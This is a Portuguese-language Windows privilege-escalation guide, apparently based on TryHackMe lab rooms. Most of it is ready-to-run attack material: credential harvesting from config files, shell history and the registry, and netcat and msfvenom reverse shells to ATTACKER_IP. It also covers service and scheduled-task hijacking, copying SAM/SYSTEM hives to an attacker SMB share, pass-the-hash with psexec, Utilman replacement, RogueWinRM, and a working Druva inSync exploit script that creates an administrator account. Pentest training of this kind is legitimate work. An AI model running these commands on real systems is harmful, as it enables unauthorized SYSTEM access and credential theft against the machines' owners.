<!-- =============================================== -->
<!--        Windows Privilege Escalation            -->
<!-- =============================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Technique-Privilege%20Escalation-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Goal-NT%20AUTHORITY%5CSYSTEM-black?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Category-Post--Exploitation-red?style=flat-square">
  <img src="https://img.shields.io/badge/Scope-Local%20Access-informational?style=flat-square">
  <img src="https://img.shields.io/badge/Methodology-Enumerate%20%E2%86%92%20Abuse%20%E2%86%92%20Elevate-black?style=flat-square">
  <img src="https://img.shields.io/badge/Focus-Red%20Team-black?style=flat-square">
</p>

---

# Escalação de Privilégios no Windows

## Introdução

A escalação de privilégios é uma fase crucial em um teste de penetração ou simulação de ataque. Após obter acesso inicial a um sistema Windows com um usuário de baixo privilégio, o objetivo é explorar configurações incorretas, permissões frágeis ou vulnerabilidades para elevar esse acesso, idealmente ao nível de `NT AUTHORITY\SYSTEM` ou de um usuário com privilégios administrativos.

---
## 1. Coletando Credenciais Expostas

Antes de tentar explorar configurações complexas, é sempre recomendável verificar se o sistema ou os usuários deixaram credenciais "esquecidas" em arquivos de configuração, histórico de comandos ou sessões salvas. A preguiça do usuário é o melhor amigo do pentester.

### 1.1. Instalações Autônomas e Arquivos de Configuração

Em ambientes corporativos, administradores podem usar arquivos de resposta para automatizar a instalação do Windows ou de softwares. Esses arquivos, como `Unattend.xml`, muitas vezes contêm senhas em texto claro ou com hashes fracos.

- **O que procurar:** Arquivos como `Unattend.xml`, `autounattend.xml`, `sysprep.inf`, `sysprep.xml` em diretórios como `C:\Windows\Panther\`, `C:\Windows\Panther\Unattend\`, ou na raiz de unidades de instalação.
- **Exemplo de conteúdo sensível:**

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

- **Comando para procurar (no PowerShell):**

```powershell
Get-ChildItem -Path C:\ -Filter *.xml -Recurse -ErrorAction SilentlyContinue | Select-String "Password"
```

**Explicação do comando:**

- `Get-ChildItem -Path C:\ -Filter *.xml -Recurse`: Procura recursivamente por todos os arquivos com extensão `.xml` a partir da raiz `C:\`.
- `-ErrorAction SilentlyContinue`: Ignora erros de acesso a pastas (comuns com usuários de baixo privilégio).
- `| Select-String "Password"`: Filtra o conteúdo dos arquivos encontrados, exibindo apenas as linhas que contêm a palavra "Password".

### 1.2. Histórico do PowerShell (PSReadLine)

O módulo `PSReadLine` no PowerShell mantém um histórico dos comandos executados pelo usuário. Este arquivo é uma mina de ouro para encontrar senhas inseridas diretamente na linha de comando.

- **Localização do arquivo de histórico:** `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
- **Comando para ler o histórico:** 

```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Explicação:** O comando `type` (equivalente ao `cat` do Linux) exibe o conteúdo do arquivo de histórico no terminal. Procure por comandos como `net user`, `net localgroup`, strings de conexão de banco de dados ou qualquer outra coisa que pareça uma senha.

**Exemplo de Resultado:**

```text
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /? 
```

- No exemplo é possível perceber que no histórico de comandos, o usuário tentou adicionar um novo usuário com o nome `julia.jones` e senha `ZuperCkretPa5z`.

### 1.3. Credenciais do Windows Salvas (cmdkey)

O Windows permite que os usuários salvem credenciais para acesso a outros servidores ou recursos. O comando `cmdkey` lista as credenciais armazenadas no Gerenciador de Credenciais. Se um usuário salvou suas credenciais de administrador, podemos tentar usá-las.

- **Listar credenciais salvas:**

```shell-session
cmdkey /list
```

**Explicação:** Este comando lista todos os alvos e nomes de usuário com credenciais armazenadas no sistema.

**Exemplo de Resultado:**

```text
Currently stored credentials:
	Target: Domain:interactive=WPRIVESC1\mike.katz
	Type: Domain Password
	User: WPRIVESC1\mike.katz 
```

- No exemplo foi é possível perceber a existência do usuário `mike.katz`.

- **Executar um comando como outro usuário com credenciais salvas:**  
    Se houver uma entrada para o usuário `admin` com a flag `savecred`, podemos tentar executar um comando como ele:

```shell-session
runas /savecred /user:mike.katz cmd.exe
```

**Explicação:**

- `runas`: Comando para executar um programa com credenciais de outro usuário.
- `/savecred`: Utiliza as credenciais salvas para o usuário especificado, não solicitando a senha.
- `/user:mike.katz`: Especifica o usuário alvo.
- `cmd.exe`: O programa a ser executado (neste caso, um prompt de comando).  
    Se for bem-sucedido, uma nova janela do `cmd` será aberta com os privilégios do usuário `admin`.

### 1.4. Strings de Conexão em Arquivos de Configuração (IIS)

Sites e aplicações web frequentemente armazenam suas strings de conexão com bancos de dados em arquivos de configuração. No IIS (Internet Information Services), o principal arquivo é o `web.config`. Essas strings podem conter senhas de bancos de dados que, se reutilizadas, podem ser a chave para outros sistemas.

- **Localização comum:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config` (para aplicações [ASP.NET](https://ASP.NET)), ou em subpastas de sites em `C:\inetpub\wwwroot\`.
- **Comando para procurar:**

```shell-session
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

**Explicação do comando:**

- `type ...`: Exibe o conteúdo do arquivo `web.config`.
- `| findstr connectionString`: Filtra a saída, mostrando apenas as linhas que contêm a palavra "connectionString", que geralmente precede as credenciais do banco de dados.

Outro comando:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Exemplo de Resultado:**

```html
<add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />

<add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />

<connectionStrings>
	<add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
</connectionStrings>
```

- No exemplo de resultado foi possível capturar a senha `098n0x35skjD3` para o usuário `db_admin` do banco de dados.


### 1.5. Recuperar Credenciais de Software (PuTTY)

Softwares de terceiros podem armazenar credenciais no registro do Windows de forma insegura. O PuTTY, um cliente SSH e telnet popular, armazena as configurações de sessão, incluindo possíveis proxies ou, em versões antigas, credenciais.

- **Comando para consultar o registro do PuTTY:**

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Explicação do comando:**

- `reg query`: Comando para consultar o registro do Windows.
- `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\`: O caminho da chave de registro onde as sessões do PuTTY são armazenadas para o usuário atual.
- `/f "Proxy"`: Procura por valores que contenham a string "Proxy". Isso pode revelar configurações de proxy que, às vezes, incluem nomes de usuário e senhas.
- `/s`: Faz a busca recursivamente em todas as subchaves (todas as sessões salvas).

**Exemplo de Resultado:**

```text
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
	ProxyExcludeList    REG_SZ
	ProxyDNS    REG_DWORD    0x1
	ProxyLocalhost    REG_DWORD    0x0
	ProxyMethod    REG_DWORD    0x0
	ProxyHost    REG_SZ    proxy
	ProxyPort    REG_DWORD    0x50
	ProxyUsername    REG_SZ    thom.smith
	ProxyPassword    REG_SZ    CoolPass2021
	ProxyTelnetCommand    REG_SZ    connect %host %port\n                            ProxyLogToTerm    REG_DWORD    0x1
```

- No exemplo é possível ver a senha `CoolPass2021` do usuário `thom.smith`

### 1.6 Listar Diretórios e Procurar Arquivos

- **Listar diretórios:**

```shell
# Listar pastas no diretório atual
dir

# Listar pastas e arquivos em todas as subpastas (incluindo ocultos, se tiver permissão)
dir /S

# Listar apenas os nomes das pastas (sem detalhes)
dir /B

# Listar pastas e salvar a lista em um arquivo de texto
dir /B > C:\Users\SeuUsuario\Desktop\lista_pastas.txt

# Listar pastas e subpastas e salvar em arquivo de texto
dir /S /B > C:\Users\SeuUsuario\Desktop\lista_completa.txt
```

- **Procurar arquivos por nome ou extensão:**
    - `dir *.txt /s` - Procura todos os arquivos .txt no diretório atual e subpastas.
    - `dir "relatorio*.pdf" /s` - Procura arquivos que comecem com "relatorio" e terminem com .pdf.

- **Listar apenas o caminho completo dos arquivos:**
    - `dir /b /s "nome_arquivo.ext"` - Exibe apenas o caminho do arquivo encontrado.

- **Procurar arquivos específicos:**
    - `dir /s /b "C:\Pasta\arquivo.docx"` - Localiza um arquivo específico na unidade C:.

- **Salvar o resultado da pesquisa em um arquivo de texto:**
    - `dir *.jpg /s /b > imagens.txt` - Lista todos os .jpg e salva em "imagens.txt". 

**Dicas adicionais:**

- **`dir /s`**: Lista arquivos no diretório atual e em todos os subdiretórios.
- **`dir /b`**: Formato "básico", mostra apenas o nome/caminho sem detalhes como tamanho ou data.

---
## 2. Abusando de Tarefas e Serviços Mal Configurados

Uma das formas mais comuns de escalar privilégios é explorar como as tarefas agendadas e os serviços do Windows são configurados e executados.

### 2.1. Tarefas Agendadas com Permissões Inseguras

Tarefas agendadas podem ser configuradas para executar um script ou binário com privilégios elevados (SYSTEM). Se um usuário de baixo privilégio puder modificar o arquivo que a tarefa executa, ele pode substituí-lo por um payload malicioso.

- **Passo 1: Identificar uma tarefa vulnerável.** Precisamos de uma tarefa que rode como um usuário privilegiado e cujo binário/script tenha permissões de escrita para o nosso usuário.

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat   # O binário/script a ser executado
Run As User:                          taskusr1                # O usuário que executa a tarefa (pode ser SYSTEM)
```

**Explicação:**

- `schtasks /query`: Comando para consultar tarefas agendadas.
- `/tn vulntask`: Especifica o nome da tarefa que queremos inspecionar.
- `/fo list`: Define o formato de saída como lista (mais legível).        
- `/v`: Mostra informações detalhadas da tarefa.

- **Passo 2: Verificar as permissões do arquivo alvo.** Usamos o `icacls` para ver quem pode modificar o arquivo `schtask.bat`.

```shell-session
C:\> icacls C:\tasks\schtask.bat
C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)   # <--- PERIGO! Todos os usuários têm Controle Total (F)
```

**Explicação:**

- `icacls`: Ferramenta de linha de comando para exibir e modificar ACLs (Access Control Lists) de arquivos e pastas.	
- `BUILTIN\Users:(I)(F)`: A saída mostra que o grupo `Users` (todos os usuários) tem permissão `F` (Full Control / Controle Total). Isso significa que podemos modificar ou substituir o arquivo.

- **Passo 3: Substituir o binário por um payload.** Vamos sobrescrever o arquivo `.bat` com um comando malicioso, como um reverse shell para a nossa máquina atacante.

```shell-session
C:\> echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

**Explicação:** O comando `echo` escreve a linha de comando para executar o netcat e enviar um shell reverso, substituindo todo o conteúdo do arquivo `schtask.bat`.

- **Passo 4: Preparar o ouvinte e executar a tarefa.**
    - No Kali, inicie um ouvinte netcat:

```bash
 nc -lvnp 4444
```

- No Windows, force a execução da tarefa agendada:

```shell-session
C:\> schtasks /run /tn vulntask
```

- **Resultado:** Se tudo correr bem, você receberá uma conexão de volta no seu netcat com os privilégios do usuário que executou a tarefa (neste exemplo, `taskusr1`). Se a tarefa rodasse como `SYSTEM`, você teria acesso de sistema.

### 2.2. AllwaysInstallElevated

Esta é uma configuração de Política de Grupo que permite que usuários comuns instalem pacotes MSI com privilégios elevados (SYSTEM). Se ambas as chaves de registro (usuário e máquina) estiverem configuradas para isso, qualquer usuário pode instalar um MSI malicioso.

- **Passo 1: Verificar as chaves de registro.** Verifique se ambas as chaves retornam um valor `REG_DWORD` igual a `1`.

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- **Passo 2: Criar um pacote MSI malicioso.** No Kali, use o `msfvenom` para gerar um payload.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
```

**Explicação:** Gera um arquivo `.msi` que, ao ser instalado, executará um shell reverso para o IP e porta especificados.

- **Passo 3: Transferir e executar o MSI.** Transfira o arquivo para a máquina alvo (ex: via `wget` ou compartilhamento de rede) e execute a instalação silenciosamente.

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


**Explicação:**

- `msiexec`: Instalador de pacotes MSI.
- `/quiet`: Modo silencioso (sem interação do usuário).
- `/qn`: Sem interface gráfica.
- `/i C:\...`: Especifica o pacote a ser instalado.

### 2.3. Permissões Inseguras em Serviços (Binário Substituível)

Muitos serviços do Windows rodam com altos privilégios (SYSTEM). Se o binário executado por um serviço estiver em um local onde um usuário comum tem permissão de escrita, podemos substituí-lo por um payload.

- **Passo 1: Verificar o binário de um serviço.** Primeiro, veja qual binário um serviço executa e com qual usuário.

```shell-session
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        SERVICE_START_NAME : .\svcuser1   # O serviço roda como um usuário chamado 'svcuser1'
```

**Passo 2: Verificar permissões no binário.** Use `icacls` para ver se você pode modificar `WService.exe`.

```shell
C:\> icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)   # <--- "M" significa Modify (Modificar)
```

**Explicação:** A permissão `M` (Modify) permite que qualquer usuário (Everyone) modifique o arquivo. Perfeito para o ataque.

- **Passo 3: Gerar, transferir e substituir o binário.** Crie um payload e substitua o executável original.

```bash
# No Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server 80
```

```shell-session
# No Windows
C:\> cd C:\PROGRA~2\SYSTEM~1\
C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
C:\PROGRA~2\SYSTEM~1> wget http://ATTACKER_IP/rev-svc.exe -O WService.exe
C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
```

**Explicação:** Fazemos backup do original, baixamos o payload, substituímos e garantimos que ele seja executável por todos.
 
- **Passo 4: Reiniciar o serviço.** Agora, precisamos reiniciar o serviço para que nosso payload seja executado.

```shell-session
C:\> net stop windowsscheduler && net start windowsscheduler
```

ou

```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

- **Resultado:** Se você tiver permissão para iniciar/parar o serviço (o que geralmente não acontece com usuários comuns, mas é comum em labs), ou se o serviço reiniciar sozinho (ex: após um reboot), você receberá a conexão como o usuário do serviço (`svcuser1`).

### 2.4. Caminhos de Serviço Não Citados (Unquoted Service Paths)

Quando o caminho para um executável de serviço contém espaços e **não está entre aspas**, o Windows pode interpretá-lo de forma ambígua, tentando executar caminhos parciais. Se tivermos permissão de escrita em uma das pastas do caminho, podemos colocar um executável malicioso que será executado com os privilégios do serviço.

- **O Problema:** Considere o caminho `C:\Program Files\My App\MyApp.exe`. Sem aspas, o Windows procura, nesta ordem:
    1. `C:\Program.exe`
    2. `C:\Program Files\My.exe`
    3. `C:\Program Files\My App\MyApp.exe`

- **Passo 1: Encontrar serviços com caminhos não citados.**

```shell-session
C:\> wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**(Este é um comando complexo, então vamos usar o `sc` em dois exemplos):**

**Exemplo 1 (Já está entre aspas, seguro):**

```shell-session
C:\> sc qc "vncserver"
BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
# Como está entre aspas, não é vulnerável a esta técnica.
```

**Exemplo 2 (Sem aspas, vulnerável):**

```shell-session
C:\> sc qc "disk sorter enterprise"
BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
# SEM ASPAS! O Windows tentará executar C:\MyPrograms\Disk.exe primeiro.
```

- **Passo 2: Verificar permissões de escrita na pasta pai.** Precisamos de permissão para criar um arquivo na pasta `C:\MyPrograms\` ou em qualquer parte do caminho não citado.

```shell-session
C:\> icacls C:\MyPrograms\
C:\MyPrograms BUILTIN\Users:(I)(CI)(WD)   # "WD" significa Write Data (Escrever Dados)
```

**Explicação:** A permissão `WD` no diretório permite que criemos novos arquivos. Isso é suficiente para colocar nosso `Disk.exe` lá.

- **Passo 3: Criar e colocar o payload.** Vamos criar um payload chamado `Disk.exe` (a primeira interpretação do caminho) e colocá-lo em `C:\MyPrograms\`.

```bash
# No Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```

```shell-session
# No Windows
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

- **Passo 4: Reiniciar o serviço.**

```shell-session
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

- Quando o serviço iniciar, ele executará `C:\MyPrograms\Disk.exe` em vez do binário original, nos dando uma shell como o usuário do serviço (`svcusr2`).    

### 2.5. Permissões de Serviço Inseguras (service _ACLs_)

Às vezes, o binário do serviço está seguro, mas as **permissões no próprio serviço** (as Service ACLs) permitem que um usuário comum reconfigure o serviço. Com a ferramenta `accesschk` do Sysinternals, podemos verificar isso.

- **Passo 1: Baixar e usar o AccessChk para verificar permissões de um serviço.**

```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS   # <--- Usuários têm TODAS as permissões no serviço!
```

**Explicação do comando `accesschk64.exe -qlc thmservice`:**

- `-q`: Modo silencioso (apenas o resultado).
- `-l`: Lista as permissões completas (ACLs).
- `-c`: Especifica que estamos verificando um serviço.        
- `thmservice`: O nome do serviço.

- **Passo 2: Gerar o payload.** Crie um payload de serviço.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

- **Passo 3: Reconfigurar o serviço.** Como temos `SERVICE_ALL_ACCESS`, podemos alterar o binário que o serviço executa (`binPath`) e o usuário com o qual ele roda (`obj`).

```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

**Explicação:**

- `sc config`: Comando para alterar a configuração de um serviço.
- `binPath= ...`: Define o novo caminho para o executável do serviço (nosso payload).        
- `obj= LocalSystem`: Define que o serviço deve rodar como `LocalSystem` (o mais alto privilégio).

- **Passo 4: Reiniciar o serviço.**

```shell-session
C:\> net stop THMService
C:\> net start THMService
```

- **Resultado:** Agora sim, ao iniciar o serviço, nosso payload roda como `NT AUTHORITY\SYSTEM`, garantindo o acesso máximo.

---
## 3. Abusando de Privilégios Atribuídos ao Usuário

Às vezes, o usuário que você controla já possui privilégios especiais no sistema. O comando `whoami /priv` revela esses privilégios. Alguns deles podem ser abusados para escalar acesso.

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### 3.1. SeBackupPrivilege e SeRestorePrivilege

Estes privilégios permitem que um usuário ignore as permissões de arquivo para fazer backup e restauração. Isso pode ser usado para copiar os arquivos do registro que contêm os hashes de senhas (SAM e SYSTEM).

- **Passo 1: Confirmar que os privilégios estão habilitados.** A saída do `whoami /priv` deve mostrar `SeBackupPrivilege` e `SeRestorePrivilege` como `Disabled`. Eles podem ser usados mesmo assim.

- **Passo 2: Fazer backup dos hives do registro.**

```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

**Explicação:** `reg save` exporta a chave de registro especificada (system e sam) para um arquivo. Graças ao `SeBackupPrivilege`, o comando funciona mesmo sem permissões de leitura direta nesses arquivos.

- **Passo 3: Transferir os arquivos para a máquina do atacante.** Uma maneira fácil é criar um servidor SMB no Kali.

```bash
# No Kali (crie uma senha para o usuário, ex: CopyMaster555)
mkdir share
python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

```shell-session
# No Windows
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

- **Passo 4: Extrair os hashes e fazer login.** Use o `secretsdump.py` do Impacket para extrair os hashes dos arquivos.

```bash
python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

A saída mostrará o hash NTLM do administrador.

- **Passo 5: Fazer login com o hash (Pass-the-Hash).** Use o `psexec.py` (ou `wmiexec.py`) para obter uma shell como SYSTEM.

```bash
python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.65.148.102

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 3.2. SeTakeOwnershipPrivilege

Este privilégio permite que um usuário tome posse de qualquer objeto do sistema, mesmo sem permissão. Podemos usar isso para assumir o controle de um arquivo crítico que roda como SYSTEM e substituí-lo.

- **Passo 1: Confirmar o privilégio.** `whoami /priv` deve mostrar `SeTakeOwnershipPrivilege`.

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

- **Passo 2: Escolher um alvo.** Um alvo clássico é o `Utilman.exe` (utilitário de acessibilidade), que pode ser acionado na tela de login.

![Utilman.exe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)


```shell-session
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

**Explicação:** `takeown` permite que o usuário se torne o proprietário do arquivo, graças ao privilégio.

- **Passo 3: Atribuir a si mesmo permissões totais no arquivo.** Agora que é o proprietário, pode conceder a si mesmo acesso total.

```shell-session
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

- **Passo 4: Substituir o arquivo alvo pelo `cmd.exe`.**

```shell-session
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

- **Passo 5: Acionar o payload.** Bloqueie a sessão do Windows (Win+L) ou vá para a tela de login. Clique no ícone de "Facilidade de Acesso" (ou pressione Win+U). Como o arquivo `utilman.exe` foi substituído pelo `cmd.exe`, um prompt de comando com privilégios de **SYSTEM** será aberto.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)

### 3.3. SeImpersonate / SeAssignPrimaryToken

Estes privilégios permitem que um processo "se passe" por outro usuário. São comuns em contas de serviço como IIS, SQL Server, etc. Ferramentas como `JuicyPotato`, `RoguePotato` e `PrintSpoofer` exploram isso para elevar para SYSTEM. O `RogueWinRM` é um exemplo que explora uma falha no serviço WinRM.

![SeImpersonate](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png)

![SeAssignPrimaryToken](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png)

- **Passo 1: Confirmar os privilégios.** `whoami /priv` deve mostrar `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)

- **Passo 2: Usar uma ferramenta de exploração.** Vamos usar o `RogueWinRM`. Baixe-o na máquina alvo.

```bash
# No Kali, inicie um ouvinte netcat
nc -lvnp 4442
```

```shell-session
# No Windows
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![RogueWinRM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)

**Explicação:**

- `RogueWinRM.exe`: A ferramenta de exploração.
- `-p "C:\tools\nc64.exe"`: O programa a ser executado com privilégios elevados.
- `-a "-e cmd.exe ATTACKER_IP 4442"`: Os argumentos para o programa (no caso, um shell reverso).

- **Resultado:** A ferramenta abusará do privilégio para forçar o serviço WinRM a executar nosso netcat como SYSTEM, nos dando uma conexão de volta com altos privilégios.
	
```bash
nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

---
## 4. Abusando de Software Vulnerável

Às vezes, a escalação não vem de uma configuração errada do Windows, mas de um software de terceiros instalado e vulnerável.

### 4.1. Identificando Software Instalado

O primeiro passo é listar o que está instalado na máquina.

```shell-session
wmic product get name,version,vendor
```

>_(Nota: `wmic` está obsoleto, mas ainda funciona. Alternativas modernas são `Get-WmiObject` ou `Get-CimInstance` no PowerShell)._

### 4.2. Caso de Estudo: Druva inSync 6.6.3

O Druva inSync é um software de backup que, em versões antigas, rodava um serviço com altos privilégios e expunha um socket na porta 6064, sem autenticação, que aceitava comandos. Isso permitia que qualquer usuário local executasse comandos como SYSTEM.

![Druva inSync](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)

- **Passo 1: Identificar a vulnerabilidade.** Após pesquisar a versão do software, descobre-se a existência do exploit.

- **Passo 2: Criar um script de exploit.** Um script em PowerShell pode se conectar ao socket e enviar um comando malicioso.

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add" # Comando para criar um admin

$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

**Explicação:** O script se conecta ao socket local na porta 6064 e envia uma mensagem formatada de acordo com o protocolo do Druva, contendo o comando que desejamos executar.

- **Passo 3: Executar o exploit e verificar.** Após executar o script no PowerShell do alvo, podemos verificar se o usuário foi criado e adicionado ao grupo de administradores.

```powershell
PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

Como último passo, é possível executar um prompt de comando como administrador:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)

---
## Ferramentas de Automação e Auxílio

Para agilizar a enumeração, existem ferramentas que consolidam a busca por muitas das vulnerabilidades mencionadas.

- **WinPEAS:** Um script executável que enumera o sistema em busca de caminhos para escalação de privilégios.

```shell
C:\> winpeas.exe > outputfile.txt
```

